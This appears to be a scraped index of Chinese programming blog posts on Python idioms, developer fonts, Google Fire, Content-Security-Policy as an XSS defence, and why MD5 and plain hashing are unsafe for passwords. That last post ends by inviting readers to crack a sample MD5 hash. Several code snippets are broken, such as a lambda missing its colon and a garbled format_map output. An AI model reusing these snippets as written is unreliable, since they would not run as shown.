7: 'A7', 8: 'A8', 9: 'A9'} 使用字典推到式反转字典Inverting a dictionary using a dictionary comprehension 12345&gt;&gt;&gt; m = {'a': 1, 'b': 2, 'c': 3, 'd': 4}&gt;&gt;&gt; m{'d': 4, 'a': 1, 'b': 2, 'c': 3}&gt;&gt;&gt; {v: k for k, v in m.items()}{1: 'a', 2: 'b', 3: 'c', 4: 'd'} 命名元组的调用Named tuples (collections.namedtuple) 12345678&gt;&gt;&gt; Point = collections.namedtuple('Point', ['x', 'y'])&gt;&gt;&gt; p = Point(x=1.0, y=2.0)&gt;&gt;&gt; pPoint(x=1.0, y=2.0)&gt;&gt;&gt; p.x1.0&gt;&gt;&gt; p.y2.0 从命名元组继承inheriting from named tuples 12345678&gt;&gt;&gt; class Point(collections.namedtuple('PointBase', ['x', 'y'])):... __slots__ = ()... def __add__(self, other):... return Point(x=self.x + other.x, y=self.y + other.y)&gt;&gt;&gt; p = Point(x=1.0, y=2.0)&gt;&gt;&gt; q = Point(x=2.0, y=3.0)&gt;&gt;&gt; p + qPoint(x=3.0, y=5.0) 集合的使用sets and set operations 123456789101112131415161718&gt;&gt;&gt; A = {1, 2, 3, 3}&gt;&gt;&gt; Aset([1, 2, 3])&gt;&gt;&gt; B = {3, 4, 5, 6, 7}&gt;&gt;&gt; Bset([3, 4, 5, 6, 7])&gt;&gt;&gt; A | Bset([1, 2, 3, 4, 5, 6, 7])&gt;&gt;&gt; A &amp; Bset([3])&gt;&gt;&gt; A - Bset([1, 2])&gt;&gt;&gt; B - Aset([4, 5, 6, 7])&gt;&gt;&gt; A ^ Bset([1, 2, 4, 5, 6, 7])&gt;&gt;&gt; (A ^ B) == ((A - B) | (B - A))True 集合的操作 12345678910111213141516&gt;&gt;&gt; A = collections.Counter([1, 2, 2])&gt;&gt;&gt; B = collections.Counter([2, 2, 3])&gt;&gt;&gt; ACounter({2: 2, 1: 1})&gt;&gt;&gt; BCounter({2: 2, 3: 1})&gt;&gt;&gt; A | BCounter({2: 2, 1: 1, 3: 1})&gt;&gt;&gt; A &amp; BCounter({2: 2})&gt;&gt;&gt; A + BCounter({2: 4, 1: 1, 3: 1})&gt;&gt;&gt; A - BCounter({1: 1})&gt;&gt;&gt; B - ACounter({3: 1}) 可迭代对象的计数 1234567&gt;&gt;&gt; A = collections.Counter([1, 1, 2, 2, 3, 3, 3, 3, 4, 5, 6, 7])&gt;&gt;&gt; ACounter({3: 4, 1: 2, 2: 2, 4: 1, 5: 1, 6: 1, 7: 1})&gt;&gt;&gt; A.most_common(1)[(3, 4)]&gt;&gt;&gt; A.most_common(3)[(3, 4), (1, 2), (2, 2)] 双端队列double-ended queue 12345678910111213141516171819&gt;&gt;&gt; Q = collections.deque()&gt;&gt;&gt; Q.append(1)&gt;&gt;&gt; Q.appendleft(2)&gt;&gt;&gt; Q.extend([3, 4])&gt;&gt;&gt; Q.extendleft([5, 6])&gt;&gt;&gt; Qdeque([6, 5, 2, 1, 3, 4])&gt;&gt;&gt; Q.pop()4&gt;&gt;&gt; Q.popleft()6&gt;&gt;&gt; Qdeque([5, 2, 1, 3])&gt;&gt;&gt; Q.rotate(3)&gt;&gt;&gt; Qdeque([2, 1, 3, 5])&gt;&gt;&gt; Q.rotate(-3)&gt;&gt;&gt; Qdeque([5, 2, 1, 3]) 最大长度双端队列double-ended queue with maximum length 123456789101112131415&gt;&gt;&gt; last_three = collections.deque(maxlen=3)&gt;&gt;&gt; for i in xrange(10):... last_three.append(i)... print ', '.join(str(x) for x in last_three)...00, 10, 1, 21, 2, 32, 3, 43, 4, 54, 5, 65, 6, 76, 7, 87, 8, 9 有序字典ordered dictionaries 123456789&gt;&gt;&gt; m = dict((str(x), x) for x in range(10))&gt;&gt;&gt; print ', '.join(m.keys())1, 0, 3, 2, 5, 4, 7, 6, 9, 8&gt;&gt;&gt; m = collections.OrderedDict((str(x), x) for x in range(10))&gt;&gt;&gt; print ', '.join(m.keys())0, 1, 2, 3, 4, 5, 6, 7, 8, 9&gt;&gt;&gt; m = collections.OrderedDict((str(x), x) for x in range(10, 0, -1))&gt;&gt;&gt; print ', '.join(m.keys())10, 9, 8, 7, 6, 5, 4, 3, 2, 1 将对象映射到唯一的计数数字mapping objects to unique counting numbers 123456789101112&gt;&gt;&gt; import itertools, collections&gt;&gt;&gt; value_to_numeric_map = collections.defaultdict(itertools.count().next)&gt;&gt;&gt; value_to_numeric_map['a']0&gt;&gt;&gt; value_to_numeric_map['b']1&gt;&gt;&gt; value_to_numeric_map['c']2&gt;&gt;&gt; value_to_numeric_map['a']0&gt;&gt;&gt; value_to_numeric_map['b']1 最大和最小元素largest and smallest elements(heapq.nlargest and heapq.nsmallest) 12345&gt;&gt;&gt; a = [random.randint(0, 100) for __ in xrange(100)]&gt;&gt;&gt; heapq.nsmallest(5, a)[3, 3, 5, 6, 8]&gt;&gt;&gt; heapq.nlargest(5, a)[100, 100, 99, 98, 98] 笛卡尔积cartesian products 1234567891011121314151617181920212223242526&gt;&gt;&gt; for p in itertools.product([1, 2, 3], [4, 5]):(1, 4)(1, 5)(2, 4)(2, 5)(3, 4)(3, 5)&gt;&gt;&gt; for p in itertools.product([0, 1], repeat=4):... print ''.join(str(x) for x in p)...0000000100100011010001010110011110001001101010111100110111101111 组合和替换组合combinations and combinations with replacemnet 12345678910111213141516171819202122&gt;&gt;&gt; for c in itertools.combinations([1, 2, 3, 4, 5], 3):... print ''.join(str(x) for x in c)...123124125134135145234235245345&gt;&gt;&gt; for c in itertools.combinations_with_replacement([1, 2, 3], 2):... print ''.join(str(x) for x in c)...111213222333 排列交换Permurtations 123456789101112131415161718192021222324252627&gt;&gt;&gt; for p in itertools.permutations([1, 2, 3, 4]):... print ''.join(str(x) for x in p)...123412431324134214231432213421432314234124132431312431423214324134123421412341324213423143124321 链式迭代chaining iterables 123456789101112131415161718192021222324252627282930313233&gt;&gt;&gt; a = [1, 2, 3, 4]&gt;&gt;&gt; for p in itertools.chain(itertools.combinations(a, 2), itertools.combinations(a, 3)):... print p...(1, 2)(1, 3)(1, 4)(2, 3)(2, 4)(3, 4)(1, 2, 3)(1, 2, 4)(1, 3, 4)(2, 3, 4)&gt;&gt;&gt; for subset in itertools.chain.from_iterable(itertools.combinations(a, n) for n in range(len(a) + 1))... print subset...()(1,)(2,)(3,)(4,)(1, 2)(1, 3)(1, 4)(2, 3)(2, 4)(3, 4)(1, 2, 3)(1, 2, 4)(1, 3, 4)(2, 3, 4)(1, 2, 3, 4) 按给定键进行分组grouping rows by a given key 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&gt;&gt;&gt; from operator import itemgetter&gt;&gt;&gt; import itertools&gt;&gt;&gt; with open('contactlenses.csv', 'r') as infile:... data = [line.strip().split(',') for line in infile]...&gt;&gt;&gt; data = data[1:]&gt;&gt;&gt; def print_data(rows):... print '\\n'.join('\\t'.join('{: &lt;16}'.format(s) for s in row) for row in rows)...&gt;&gt;&gt; print_data(data)young myope no reduced noneyoung myope no normal softyoung myope yes reduced noneyoung myope yes normal hardyoung hypermetrope no reduced noneyoung hypermetrope no normal softyoung hypermetrope yes reduced noneyoung hypermetrope yes normal hardpre-presbyopic myope no reduced nonepre-presbyopic myope no normal softpre-presbyopic myope yes reduced nonepre-presbyopic myope yes normal hardpre-presbyopic hypermetrope no reduced nonepre-presbyopic hypermetrope no normal softpre-presbyopic hypermetrope yes reduced nonepre-presbyopic hypermetrope yes normal nonepresbyopic myope no reduced nonepresbyopic myope no normal nonepresbyopic myope yes reduced nonepresbyopic myope yes normal hardpresbyopic hypermetrope no reduced nonepresbyopic hypermetrope no normal softpresbyopic hypermetrope yes reduced nonepresbyopic hypermetrope yes normal none&gt;&gt;&gt; data.sort(key=itemgetter(-1))&gt;&gt;&gt; for value, group in itertools.groupby(data, lambda r: r[-1]):... print '-----------'... print 'Group: ' + value... print_data(group)...-----------Group: hardyoung myope yes normal hardyoung hypermetrope yes normal hardpre-presbyopic myope yes normal hardpresbyopic myope yes normal hard-----------Group: noneyoung myope no reduced noneyoung myope yes reduced noneyoung hypermetrope no reduced noneyoung hypermetrope yes reduced nonepre-presbyopic myope no reduced nonepre-presbyopic myope yes reduced nonepre-presbyopic hypermetrope no reduced nonepre-presbyopic hypermetrope yes reduced nonepre-presbyopic hypermetrope yes normal nonepresbyopic myope no reduced nonepresbyopic myope no normal nonepresbyopic myope yes reduced nonepresbyopic hypermetrope no reduced nonepresbyopic hypermetrope yes reduced nonepresbyopic hypermetrope yes normal none-----------Group: softyoung myope no normal softyoung hypermetrope no normal softpre-presbyopic myope no normal softpre-presbyopic hypermetrope no normal softpresbyopic hypermetrope no normal soft 在任意目录中启动http服务器 start a static http server in any directory 1python -m SimpleHTTPServer 5000","link":"/2019/12/25/decomposing-elements-from-iteratable-objects-md/"},{"title":"使用生成器表达式来改写数据量比较大列表推导","text":"列表推导的缺点是：在推导过程中，对于输入序列的每个值都要创建仅含一项元素的全新列表。如果数据量较大会消耗大量内存，导致程序崩溃。 推导代码：12value = [len(x) for x in open('\\file.txt')]print(value) 为了解决此问题Python提供了生成器表达式（generator expression），它是对列表推导和生成器的一种泛化(generalization)。生成器表达式在运行的时候并不会把整个输出序列都呈现出来，而是会估值为迭代器(iterator)，这个迭代器每次可以根据生成器表达式产生一项数据。 生成器表达式把实现列表推导式所用的写法放入一对圆括号中，就构成了生成器表达式。 123it = (len(x) for x in open('\\file.txt'))print(it)print(next(it)) 生成器表达式组合123it = (len(x) for x in open('\\file.txt'))roots = ((x,x**0.5) for x in it)print(next(roots)) 外围的迭代器每次前进时，都会推动内部的迭代器。 组合的表达式速度会很快 二者区别生成器表达式求值时，它会立刻返回一个迭代器，而不会深入处理文件中的内容。","link":"/2020/04/17/generator-expression/"},{"title":"编程代码字体","text":"说到字体，之前看过西蒙·加菲尔德的《字体故事》非常不错的一本书，没有看过可以看看👉字体故事。字体真的是非常重要的基础设施。但凡是能够接触到信息除了口口相传，就一定能接触到字体。 最近不少大公司开始放出免费的为编程人员使用的字体，感谢。 MS家专为新的终端程序设计的Cascadia Code. 美国政府在U.S. Web Design System设计的Public Sans IBM为灵感设计的 IBM Plex Highway Gothic 为灵感设计的Overpass Font Jet Brains设计的Monospaced Font 以上字体都可以免费使用，不用担心版权问题。 MS Cascadia Code This is a fun, new monospaced font that includes programming ligatures and is designed to enhance the modern look and feel of the Windows Terminal. Download👉link 美国政府公布的原始码字形，修改自经典英文字体LibreFranklin Font的开源版本，比原有字体更清晰，对屏幕阅读有更好的易读性。 Public Sans 提供各种字型厚度，font-weight 从100-900，包含italic，无论是标题还是内文都有非常好的表现。 download👉link IBM Plex IBM Plex Family 由三大字体类型组成，Sans-serif，Serif和Mono，除了提供8中字重外，IBM Plex也提供了网页使用的eot woff, woff2格式 官网👉link Download 👉link Overpass Font Overpass设计灵感来自联邦高速公路字体，美国、加拿大、土耳其、澳大利亚、荷兰、中国都是使用联邦高速公路字体，不过现在部分地区已经使用Clearview替代。 官网地址 Monospaced Font JetBrains Mono 比一般的等宽字体来说增加了字体高度以提升阅读体验，更適合做变成代码使用，除了节省空间，也减少眼睛处理的时间。 官网地址 👉link","link":"/2020/02/28/fonts-for-developers/"},{"title":"google-fire.md","text":"Python Fire is a library for automatically generating command line interfaces (CLIs) from absolutely any Python object. fire 是Google开源的一个python库，能够以简单的方式生成CLI，使得使用REPL更加容易。 安装直接pypi库1pip install fire 使用函数12345import firedef hello(name=\"world\") return 'Hello {name}!'.format(name=name)if __name__ == '__main__': fire.Fire(hello) hello函数接收name参数，并有默认值”world”，使用fire.Fire(hello)即可简单快速的实现命令功能.1234$python hello.pyHello world!$python hello.py --name=RoyHello roy! Class的使用fire支持类的调用方式。123456789import fireclass Calculator(object): def double(self,number): return 2*number def triple(self,number): return 3*numberif __name__ == '__main__': fire.Fire(Calculator) 使用方法1234$python calculator.py double 1020$python calculator.py triple --number=1545 fire的使用非常简单，定义一个对象，剩下的交给fire来处理，it’s very pythonic.","link":"/2020/01/13/google-fire-md/"},{"title":"金庸武侠小说大全-电子版下载","text":"飞雪连天射白鹿，笑书神侠倚碧鸳，感谢查老带来的经典武侠作品，虽然没有读过几本，在大家读金庸的时候相同的时间我给了韩寒、苏童、王小波、路遥还有一系列的《电脑报》、《萌芽》、《Hacker X档案》 《黑客防线》等书籍，以下为整理的金庸武侠大全电子版，供大家下载： 《飞狐外传》 《雪山飞狐》 《连城诀》 《天龙八部》 《射雕英雄传》 《白马啸西风》 《鹿鼎记》 《笑傲江湖》 《书剑恩仇录》 《神雕侠侣》 《侠客行》 《倚天屠龙记》 《碧血剑》 《鸳鸯刀》 《越女剑》 电子书说明 TXT版本 txt版本下载 插图版 插图版下载 PDF三联 PDF版下载","link":"/2018/11/05/hero-novel/"},{"title":"XSS终结者Content-Security-Policy","text":"CSP全称为Content Security Policy,即内容安全策略。主要以白名单的形式配置可信任的内容来源，在网页中，能够使白名单中的内容正常执行（JS，CSS，image等），而非白名单的内容无法正常执行，从而减少跨站脚本攻击（XSS），当然也能够减少运营商劫持的内容注入攻击。 example： 不支持CSP的浏览器将会自动忽略CSP的信息，不会有什么影响。 浏览器兼容性查询caniuse CSP 语法组成策略类型csp有两种策略类型： Conten-Security-Policy Content-Security-Policy-Report-Only 这两种策略类型的主要区别也i可以从命名上看出，第一种对不安全的资源会进行阻止，第二种只会进行数据上报，不会有实际的阻止。 当定义多个策略的时候，浏览器会优先采用最先定义的。 指令集合CSP的指令是指组成内容来源白名单的关键，上面两种策略类型含有以下 指令示例及说明 指令 取值示例 说明 default-src ‘self’ cdn.example.com 定义针对所有类型（js/image/css/web font/ajax/iframe/多媒体等）资源的默认加载策略，某类型资源如果没有单独定义策略，就使用默认。 script-src ‘self’ js.example.com 定义针对JavaScript的加载策略 object-src ‘self’ 针对,, 等标签的加载策略 style-src ‘self’ css.example.com 定义针对样式的加载策略 img-src ‘self’ image.example.com 定义针对图片的加载策略 media-src ‘media.example.com’ 针对或者引入的html多媒体等标签的加载策略 frame-src ‘self’ 针对iframe的加载策略 connect-src ‘self’ 针对Ajax、WebSocket等请求的加载策略。不允许的情况下，浏览器会模拟一个状态为400的响应 font-src font.qq.com 针对Web Font的加载策略 sandbox allow-forms allow-scripts 对请求的资源启用sandbox report-uri /some-report-uri 告诉浏览器如果请求的资源不被策略允许时，往哪个地址提交日志信息。不阻止任何内容，可以改用Content-Security-Policy-Report-Only头 base-uri ‘self’ 限制当前页面的url（CSP2） child-src ‘self’ 限制子窗口的源(iframe、弹窗等),取代frame-src（CSP2） form-action ‘self’ 限制表单能够提交到的源（CSP2） frame-ancestors ‘none’ 限制了当前页面可以被哪些页面以iframe,frame,object等方式加载（CSP2） plugin-types application/pdf 限制插件的类型（CSP2） 指令值示例及说明 指令值 示例 说明 * img-src * 允许任何内容 ‘none’ img-src ‘none’ 不允许任何内容 ‘self’ img-src ‘self’ 允许同源内容 data: img-src data: 允许data:协议（如base64编码的图片） www.a.com img-src www.a.com 允许加载指定域名的资源 *.a.com img-src *.a.com 允许加载a.com任何子域的资源 https://img.com img-src https://img.com 允许加载img.com的https资源 https: img-src https: 允许加载https资源 ‘unsafe-inline’ script-src ‘unsafe-inline’ 允许加载inline资源（style属性，onclick，inline js和inline css等等） ‘unsafe-eval’ script-src ‘unsafe-eval’ 允许加载动态js代码，例如eval() CSP的使用方式HTML Meta标签在这种形式中，Meta标签主要含有两部分的key-value: http-equiv content http-equiv的value为CSP的策略类型，而content则是声明指令集合，即白名单。如 在HTML的head标签中添加上面的Meta标签，当浏览器支持CSP标准时，Content-Security-Policy实际阻止策略将会使得非同源的script(根据指令集合来定)不会被加载及执行。 Meta标签的Content-Security-policy-Report-Only方式在当前（2020/10）多数移动端浏览器上表现正常，但是不推荐这样做，在Chrome 50 会产生如下的提示 The report-only Content Security Policy xxxxxxx was delivered via a element,which is disallowed. The policy has been ignored. HTTP Header通过Meta的方式很是简单，但当涉及到页面较多时，使用Meta标签的方式需要在每个页面都鸽子加上。如果通过服务端配置HTML返回的响应头HTTP Header带上CSP的指令的话，那将能够一劳永逸，同事支持多个页面。下面为响应头 Response Header Connection: keep-alive Content-Security-Policy: script-src ‘self’ *.qq.com *.url.cn 不仅如此，这种形式的Content-Security-Policy-Report-Only方式能够得到更好的兼容支持，也是推荐方式。 实践经验CSP的阻止加载及执行的方式相当强大，也因为它如此强大，所以在使用时更是要小心谨慎，毕竟，如果一个不小心制定了错误的指令集合方案，那将可能导致阻止了正常文件的加载，影响业务功能，这是相当危险的。 一步步制定你的CSP方案1. 通过HTML Meta标签进行初步方案的制定（meta标签已不支持report-uri 2019.7）这种方式实现成本低，只对当前的HTML有效，从而能够进行逐步灰度。当然存在上面提及的兼容性问题，但如果现在时移动端上，或者在可逾期的浏览器内核上跑的话，在兼容性满足的情况下，那还是可以用过这个方式进行Report-Only。结合自己业务的资源情况以及在Chrome上调试制定初步方案。 2. 使用HTTP Header的Content-Security-Policy-Report-Only方式进一步确定方案由于上面的Meta标签存在一定的兼容问题，所以当我们制定了初步方案后，就可以开始使用HTTP Header的形式，小心使得万年船，这里还是建议先使用Report-Only的方式，并制定上报的url来收集阻止的内容，通过上报的数据进行方案的优化，从而进一步确定具体方案。 3.HTTP Header改用Content-Security-Policy策略进行实际拦截阻止具体的CSP方案经过上面两轮洗礼，在分析完上报的数据，确定白雾疏漏后，可将HTTP Header改用Content-Security-Policy策略，从而进行实际拦截阻止。 项目实践数据从过腾讯使用CSP后的上报拦截数据 日期 CSP阻止量 在线PV 占比 2016.03.31 23431 545872 4.31% 2016.04.01 24459 619979 3.95% 2016.04.02 20398 525055 3.88% 2016.04.02 19938 475985 4.19% 2016.04.03 23140 507329 4.56% 从上面的数据可以看出，每天被攻击的情况呈现出一种稳定持续的倾向，而且这类攻击一版不是针对某个业务的，具备了普遍性，这样的影响范围可想而知。 参考 https://www.w3.org/TR/CSP/#changes-from-level-1http://w3c.github.io/webappsec-csp/Content-Security-Policy Header ⟶ CSP Reference &amp; ExamplesContent Security Policy 1.0Content Security Policy Level 3Content Security Policy Level 3Content-Security-Policy Header ⟶ CSP Reference &amp; ExamplesContent Security Policy 1.0","link":"/2020/10/22/csp-xss/"},{"title":"lambda-function","text":"Python: What is a Lambda Function? In Python ,the lambda keyword is used to define an anonymous(i.e.,nameless) function, using the follow syntax: lambda parameters: expression Assunme we have the follow list of fruits: fruits = ['apple','orange','grape','lemon','mango','banana'] Now imagine we need to filter our list to print only fruit names which are 5 characters long.We could do so by defining a named function to test word lengths,and then passing it (and our list of fruits) to filter(): 1234567def five_letter_words(word): if len(word) == 5: return Truefive_letter_fruits = filter(five_letter_words,fruits)for fruit in five_letter_fruits: print(fruit) Or, the same task can be accomeplished directly in filter() using lambda expression, without needing to define a separate named function: 123five_letter_fruits = filter(lambda word:len(word)==5,fruits)for fruit in five_letter_fruits: print(fruit) Beacuse lambda functions are Python expressions, they can be assigned to variables.So, this: 12add_two = lambda x,y x+yadd_two(3,5) Is equivalent to this: 123def add_two(x,y): return x+yadd_two(3,5)","link":"/2020/05/16/lambda-function/"},{"title":"为什么不能使用MD5来存储密码","text":"很多软件工程师都认为 MD5 是一种加密算法，然而这种观点其实是大错特错并且十分危险的，作为一个 1992 年第一次被公开的算法，到今天为止已经被发现了一些致命的漏洞，我们在生产环境的任何场景都不应该继续使用 MD5 算法，无论是对数据或者文件的内容进行校验还是用于所谓的『加密』。 这篇文章的主要目的是帮助读者理解 MD5 到底是什么，为什么我们不应该继续使用它，尤其是不应该使用它在数据库中存储密码，作者也希望使用过 MD5 或者明文存储密码的开发者们能够找到更加合理和安全的方式对用户的这些机密信息进行存储（这样也可以间接提高我在各类网站中存储密码的安全性）。 概述为什么我们不能使用MD5来存储密码？≈为什么我们不能使用明文来存储密码？ 使用明文来存储密码是一种看起来就不可行的方案，除非我们能够100%保证数据库中的密码不会被任何人访问到，不仅包含潜在的攻击者，还包括系统的开发者和管理员。 显然这是一个非常理想的情况，在实际的生产环境，我们不能抵御来自黑客的所有攻击，甚至也不能完全阻挡开发者和管理员的访问，因为我们总需要信任并授权一些人或者程序具有当前数据库的所有访问权限，这也就给攻击者留下了可以利用的漏洞，在抵御外部攻击时我们没有办法做到全面，只能尽可能提高攻击者的成本，这也就是使用 MD5 或者其他方式存储密码的原因了。 很多开发者对于 MD5 的作用和定义都有着非常大的误解，MD5 并不是一种加密算法，而是一种摘要算法，我们也可以叫它哈希函数，哈希函数可以将无限键值空间中的所有键都均匀地映射到一个指定大小的键值空间中；一个好的摘要算法能够帮助我们保证文件的完整性，避免攻击者的恶意篡改，但是加密算法或者加密的功能是 —— 通过某种特定的方式来编码消息或者信息，只有授权方可以访问原始数据，而没有被授权的人无法从密文中获取原文。 由于加密需要同时保证消息的秘密性和完整性，所以加密的过程使用一系列的算法，MD5 确实可以在加密的过程中作为哈希函数使用来保证消息的完整性，但是我们还需要另一个算法来保证消息的秘密性，所以由于 MD5 哈希的信息无法被还原，只依靠 MD5 是无法完成加密的。 在任何场景下，我们都应该避免 MD5 的使用，可以选择更好的摘要算法替代 MD5，例如 SHA256、SHA512。 聊了这么多对于 MD5 的误解，我们重新回到今天最开始的题目，『为什么 MD5 不能用于存储密码』，对于这个问题有一个最简单的答案，也就是 MD5 不够安全。当整个系统中的数据库被攻击者入侵之后，存储密码的摘要而不是明文是我们能够对所有用户的最大保护。需要知道的是，不够安全的不只是 MD5，任何摘要算法在存储密码这一场景下都不够安全，我们在这篇文章中就会哈希函数『为什么哈希函数不能用于存储密码』以及其他相关机制的安全性。 设计既然我们已经对哈希函数和加密算法有了一些简单的了解，接下来的这一节中分析使用以下几种不同方式存储密码的安全性： 使用哈希存储密码； 使用哈希加盐存储密码； 使用加密算法存储密码； 使用bcrypt存储密码； 在分析的过程中可能会涉及到一些简单的密码学知识，也会谈到一些密码学历史上的一些事件，不过这对于理解不同方式的安全性不会造成太大的障碍。 哈希在今天，如果我们直接使用哈希来存储密码，那其实跟存储明文没有太多的区别，所有的攻击者在今天都已经掌握了彩虹表这个工具，我们可以将彩虹表理解成一张预计算的大表，其中存储着一些常见密码的哈希，当攻击者通过入侵拿到某些网站的数据库之后就可以通过预计算表中存储的映射来查找原始密码。 攻击者只需要将一些常见密码提前计算一些哈希就可以找到数据库中很多用于存储的密码，Wikipedia 上有一份关于最常见密码的 列表，在 2016 年的统计中发现使用情况最多的前 25 个密码占了调查总数的 10%，虽然这不能排除统计本身的不准确因素，但是也足以说明仅仅使用哈希的方式存储密码是不够安全的。 哈希加盐仅仅使用哈希来存储密码无法抵御来自彩虹表的攻击，在上世纪 70 到 80 年代，早期版本的 Unix 系统就在 /etc/passwrd 中存储加盐的哈希密码，密码加盐后的哈希与盐会被一起存储在 /etc/passwd 文件中，今天哈希加盐的策略与几十年前的也没有太多的不同，差异可能在于盐的生成和选择： md5(salt,password),salt 加盐的方式主要还是为了增加攻击者的计算成本，当攻击者顺利拿到数据库中的数据时，由于每个密码都使用了随机的盐进行哈希，所以预先计算的彩虹表就没有办法立刻破译出哈希之前的原始数据，攻击者对每一个哈希都需要单独进行计算，这样能够增加了攻击者的成本，减少原始密码被大范围破译的可能性。 在这种情况下，攻击者破解一个用户密码的成本其实就等于发现哈希碰撞的概率，因为攻击者其实不需要知道用户的密码是什么，他只需要找到一个值 value，这个值加盐后的哈希与密码加盐后的哈希完全一致就能登录用户的账号： hash(salt,value)= hash(salt,password) 这种情况在密码学中叫做哈希碰撞，也就是两个不同值对应哈希相同，一个哈希函数或者摘要算法被找到哈希碰撞的概率决定了该算法的安全性，早在几十年前，我们就在 MD5 的设计中发现了缺陷并且在随后的发展中找到了低成本快速制造哈希碰撞的方法。 1996 年 The Status of MD5 After a Recent Attack —— 发现了 MD5 设计中的缺陷，但是并没有被认为是致命的缺点，密码学专家开始推荐使用其他的摘要算法； 2004 年 How to Break MD5 and Other Hash Functions —— 发现了 MD5 摘要算法不能抵抗哈希碰撞，我们不能在数字安全领域使用 MD5 算法； 2006 年 A Study of the MD5 Attacks: Insights and Improvements —— 创建一组具有相同 MD5 摘要的文件； 2008 年 MD5 considered harmful today —— 创建伪造的 SSL 证书； 2010 年 MD5 vulnerable to collision attacks —— CMU 软件工程机构认为 MD5 摘要算法已经在密码学上被破译并且不适合使用; 2012 年 Flame —— 恶意软件利用了 MD5 的漏洞并伪造了微软的数字签名； 从过往的历史来看，为了保证用户敏感信息的安全，我们不应该使用 MD5 加盐的方式来存储用户的密码，那么我们是否可以使用更加安全的摘要算法呢？不可以，哈希函数并不是专门用来设计存储用户密码的，所以它的计算可能相对来说还是比较快，攻击者今天可以通过 GPU 每秒执行上亿次的计算来破解用户的密码，所以不能使用这种方式存储用户的密码，感兴趣的读者可以了解一下用于恢复密码的工具 Hashcat。 加密既然今天的硬件已经能够很快地帮助攻击者破解用户的密码，那么我们能否通过其他的方式来取代哈希函数来存储密码呢？有些工程师想到使用加密算法来替代哈希函数，这样能够从源头上避免哈希碰撞的的发生，这种方式看起来非常美好，但是有一个致命的缺点，就是我们如何存储用于加密密码的秘钥。 既然存储密码的仓库能被泄露，那么用于存储秘钥的服务也可能会被攻击，我们永远都没有办法保证我们的数据库和服务器是安全的，一旦秘钥被攻击者获取，他们就可以轻而易举地恢复用户的密码，因为核对用户密码的过程需要在内存对密码进行解密，这时明文的密码就可能暴露在内存中，依然有导致用户密码泄露的风险。 使用加密的方式存储密码相比于哈希加盐的方式，在一些安全意识和能力较差的公司和网站反而更容易导致密码的泄露和安全事故。 bcrypt哈希加盐的方式确实能够增加攻击者的成本，但是今天来看还远远不够，我们需要一种更加安全的方式来存储用户的密码，这也就是今天被广泛使用的 bcrypt，使用 bcrypt 相比于直接使用哈希加盐是一种更加安全的方式，也是我们目前推荐使用的方法，为了增加攻击者的成本，bcrypt 引入了计算成本这一可以调节的参数，能够调节执行 bcrypt 函数的成本。 当我们将验证用户密码的成本提高几个数量级时，攻击者的成本其实也相应的提升了几个数量级，只要我们让攻击者的攻击成本大于硬件的限制，同时保证正常请求的耗时在合理范围内，我们就能够保证用户密码的相对安全。 “bcrypt was designed for password hashing hence it is a slow algorithm. This is good for password hashing as it reduces the number of passwords by second an attacker could hash when crafting a dictionary attack. “ bcrypt 这一算法就是为哈希密码而专门设计的，所以它是一个执行相对较慢的算法，这也就能够减少攻击者每秒能够处理的密码数量，从而避免攻击者的字典攻击。 12345678910111213141516func main() { for cost := 10; cost &lt;= 15; cost++ { startedAt := time.Now() bcrypt.GenerateFromPassword([]byte(\"password\"), cost) duration := time.Since(startedAt) fmt.Printf(\"cost: %d, duration: %v\\n\", cost, duration) }}$ go run bcrypt.gocost: 10, duration: 51.483401mscost: 11, duration: 100.639251mscost: 12, duration: 202.788492mscost: 13, duration: 399.552731mscost: 14, duration: 801.041128mscost: 15, duration: 1.579692689s 运行上述 代码片段 时就能发现 cost 和运行时间的关系，算法运行的成本每 +1，当前算法最终的耗时就会翻一倍，这与 bcrypt 算法的实现原理有关，你可以在 Wikipedia 上找到算法执行过程的伪代码，这可以帮助我们快速理解算法背后的设计。 如果硬件的发展使攻击者能够对使用 bcrypt 存储的密码进行攻击时，我们就可以直接提升 bcrypt 算法的 cost 参数以增加攻击者的成本，这也是 bcrypt 设计上的精妙之处，所以使用 bcrypt 是一种在存储用户密码时比较安全的方式。 总结这篇文章分析的问题其实是 —— 当数据库被攻击者获取时，我们怎么能够保证用户的密码很难被攻击者『破译』，作为保护用户机密信息的最后手段，选择安全并且合适的方法至关重要。攻击者能否破解用户的密码一般取决于两个条件： 使用的加密算法是否足够安全，使用暴力破解的方式时间成本极高； 足够好的硬件支持，能够支持大规模地高速计算哈希； 抵御攻击者的攻击的方式其实就是提高单次算法运行的成本，当我们将用户的验证耗时从 0.1ms 提升到了 500ms，攻击者的计算成本也就提升了 5000 倍，这种结果就是之前需要几小时破解的密码现在需要几年的时间。 不论如何，使用 MD5、MD5 加盐或者其他哈希的方式来存储密码都是不安全的，希望各位工程师能够避免在这样的场景下使用 MD5，在其他必须使用哈希函数的场景下也建议使用其他算法代替，例如 SHA-512 等。 当然，如何保证用户机密信息的安全不只是一个密码学问题，它还是一个工程问题，任何工程开发商的疏漏都可能导致安全事故，所以我们作为开发者在与用于敏感信息打交道时也应该小心谨慎、怀有敬畏之心。到最后，我们还是来看一些比较开放的相关问题，有兴趣的读者可以仔细思考一下下面的问题： 使用 GPU 每秒可以计算多少 MD5 哈希（数量级）？能够在多长时间破解使用 MD5 加盐存储的密码？ 假设计算一次哈希耗时 500ms，破解 bcrypt 算法生成的哈希需要多长时间？ MD5 哈希 23cdc18507b52418db7740cbb5543e54 对应的原文可能是？谈谈你使用的工具和破译的过程。 Reference Is salted MD5 or salted SHA considered secure? How to securely hash passwords? Rainbow table The MD5 Message-Digest Algorithm · RFC1321 Collision (computer science) Why You Should Use Bcrypt to Hash Stored Passwords How can bcrypt have built-in salts? bcrypt","link":"/2020/08/20/no-md5/"},{"title":"old-string-formatting","text":"旧式字符串格式化%操作符可以实现字符串格式化。它将左侧的参数作为类似sprintf()式的格式化字符串，而将右侧的代入，然后返回格式化后的字符串。 for example: 123math&gt;&gt;&gt;print('The value of PI is approximately %5.3f.' %math.pi)The value of PI is approximately 3.142 123For example.'The sum of 1 + 2 is 3'str.format_map(mapping) 1234567default(dict): def __missing__(self,key): return key '{name} was born in {country}'.format_map(default(name='Guido'))'Guido war borin in country' str.index(sub[,start[,end]]) Like find(),but raise ValueError when the substring is not found. 区别与find(),find的结果为False时返回-1，index()的查询值如果不在str中，则会报错。 12changxufeng.find('y')//return -1changxufeng.index('y')// ValueError:substring not found str.isalnum() Return true if all characters in the string are alphanumeric and there is at least one character,false otherwise. A character c is alphanumeric if one of the following returns True: 